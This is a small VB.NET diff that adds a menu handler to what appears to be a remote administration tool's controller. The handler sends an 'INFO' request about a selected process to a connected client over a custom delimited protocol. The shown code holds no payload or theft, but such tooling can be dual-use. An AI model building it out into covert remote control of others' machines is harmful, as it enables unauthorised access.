@@ -39,4 +39,17 @@
 
         End If
     End Sub
+
+    Private Async Sub InfoProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InfoProcessToolStripMenuItem.Click
+        If ListView1.SelectedItems.Count = 1 Then
+
+
+
+            Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|INFO|" & "|SP2|" & ListView1.SelectedItems(0).Text & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
+
+
+        End If
+    End Sub
 End Class
